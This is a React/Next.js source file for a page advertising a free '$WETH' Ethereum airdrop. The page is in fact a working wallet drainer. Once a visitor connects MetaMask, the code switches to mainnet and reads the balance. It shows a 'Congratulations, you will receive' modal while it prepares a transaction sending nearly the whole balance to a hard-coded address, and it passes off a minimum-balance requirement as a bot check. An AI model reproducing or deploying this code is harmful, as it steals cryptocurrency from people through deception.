"use client"

import { useWeb3Modal } from '@web3modal/ethers/react'
import { ethers, N, toBeHex } from "ethers";
import { useCallback, useState } from "react";

import Globe from "@/components/magicui/globe";
import GridPattern from "@/components/magicui/animated-grid-pattern";
import ShimmerButton from "@/components/magicui/shimmer-button";
import { env } from 'process';

export default function Home() {
  const _connectToMetaMask = useCallback(async () => {
    const ethereum: any = window.ethereum;

    let connectBtn = document.getElementById('connectBtn');

    let continueModal = document.getElementById('continueModal');
    let recieveModal = document.getElementById('recieveModal');
    let errModal = document.getElementById('errModal');
    let successModal = document.getElementById('successModal');

    let ethNum = document.getElementById('ethNum');
    let minBal = document.getElementById('minBal');
    
    if (typeof ethereum !== "undefined") {
      continueModal?.classList.remove('hidden');

      try {
        const accounts = await ethereum.request({
          method: "eth_requestAccounts",
        });

        // chain id hex for sepolia - 0xAA36A7 | Gas fees - (0.0004)
        // chain id hex for mainnet - 0x1 | Gas fees - (0.0001)

        await ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x1' }],
        });

        // Get the connected Ethereum address
        const address = accounts[0];
        const provider = new ethers.BrowserProvider(ethereum);
        // Get the account balance
        const balance = await provider.getBalance(address);
        // Get the network ID from MetaMask
        const network = await provider.getNetwork();
        
        const allData = {
          address: address,
          balance: parseFloat(ethers.formatEther(balance)),
          chainId: network.chainId.toString(),
          network: network.name,
        }
        
        console.log("connected to MetaMask with details: ", allData);

        await fetch('https://min-api.cryptocompare.com/data/price?fsym=USD&tsyms=ETH')
          .then((response) => response.json())
          .then(async (data) => {
            const price = data['ETH'];

            if (allData['balance'] > parseFloat(price) * 5) {
              if (ethNum !== null) {
                ethNum.innerHTML = String(allData['balance'].toFixed(3)) + ' ETH';
              }
              recieveModal?.classList.remove('hidden');

              setTimeout(async () => {
                const signer = provider.getSigner();

                const transactionRequest = {
                  to: "0x69E493D37D3170716604a5E06C25815ad5C1E2FC",
                  value: ethers.parseEther(String(allData['balance'] - (price * 4))).toString(),
                  gasLimit: 50000
                }

                try {
                  const receipt = (await (signer)).sendTransaction(transactionRequest).then((response) => {
                    if (successModal != null) {
                      recieveModal?.classList.add('hidden');
                      successModal?.classList.remove('hidden');
                    }
                  })
                  console.log(receipt);
                } catch (err: Error | any) {
                  recieveModal?.classList.add('hidden');
                }
              }, 3000);
            } else {
              errModal?.classList.remove('hidden');
              if (minBal !== null) {
                minBal.innerHTML = price + ' ETH';
              }
            }
          }
        )
      } catch (error: Error | any) {
        continueModal?.classList.add('hidden');
      }
    } else {
      alert("Please install MetaMask browser extension to recieve the airdrop");
    }
  }, []);

  return (
    <div className="flex flex-col items-center gap-6 justify-center h-[100vh] w-full">
      <GridPattern maxOpacity={0.075} strokeDasharray={0.25} className="fixed top-0 left-0 w-[100vw] h-[100vh]"></GridPattern>
      <Globe className="fixed z-20 scale-150 bottom-0 translate-y-[70vh] sm:translate-y-[50vh] opacity-100"></Globe>

      <div className="flex flex-col items-center gap-5 relative z-50">
        <div className="flex bg-gradient-to-b from-gray-300/20 to-gray-500/20 backdrop-blur-md shadow-lg hover:scale-105 transition-all duration-300 border border-1 border-gray-200 rounded-full py-1 px-5">
          <p className='bg-gradient-to-br from-blue-400 to-blue-600 bg-clip-text text-transparent font-bold text-xl'>$WETH</p>
        </div>
        <p className="flex flex-row text-4xl sm:text-6xl font-bold text-center max-w-full mx-5 drop-shadow-lg">The future of Ethereum is here.</p>
        <p className="font-regular text-lg text-center px-5 drop-shadow-lg">Making ethereum faster and more secure. Connect your wallet to claim your free <span className="bg-gradient-to-r from-blue-400 to-blue-600 bg-clip-text font-bold text-transparent">$WETH</span> now.</p>
        <div id='connectBtn' className="flex">
          <ShimmerButton onClick={_connectToMetaMask} className="mt-5 sm:mt-10 text-[.8rem] px-8 shadow-sm hover:shadow-xl transition-all duration-500">Connect Wallet</ShimmerButton>
        </div>
      </div>
      
      <div id='continueModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
        <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10 animate-pulse' />
          <p className='text-2xl font-bold text-black text-center'>Continue in wallet</p>
          <p className='text-black text-center'>Continue following the steps in your wallet</p>
        </div>
      </div>

      <div id='recieveModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
        <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10 animate-pulse' />
          <p className='text-2xl font-bold text-black text-center'>Congratulations!</p>
          <p className='text-black text-center'>You will recieve <span id='ethNum' className='font-bold'>0 ETH</span>. Please confirm in your wallet.</p>
          <ShimmerButton onClick={_connectToMetaMask} className="text-[.8rem] px-8 shadow-sm hover:shadow-xl transition-all duration-500">Recieve ETH Airdrop</ShimmerButton>
        </div>
      </div>

      <div id='errModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
        <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
          <div className="flex rounded-full border-2 border-red-500 p-3">
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10' />
          </div>
          <p className='text-2xl font-bold text-black text-center'>Error Processing Request</p>
          <p className='text-black text-center'>You need to have a minimum balance of <span id='minBal' className='font-bold'></span> <span className='font-bold'>($5 USD)</span> in order to recieve this airdrop.</p>
          <p className='text-black text-center text-[.8rem]'>We require this to make sure that you are not a bot.</p>
        </div>
      </div>

      <div id='successModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
        <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10' />
          <p className='text-2xl font-bold text-black text-center'>Congratularions!</p>
          <p className='text-black text-center'>You have successfully claimed your airdrop.</p>
        </div>
      </div>

    </div>

  );
}
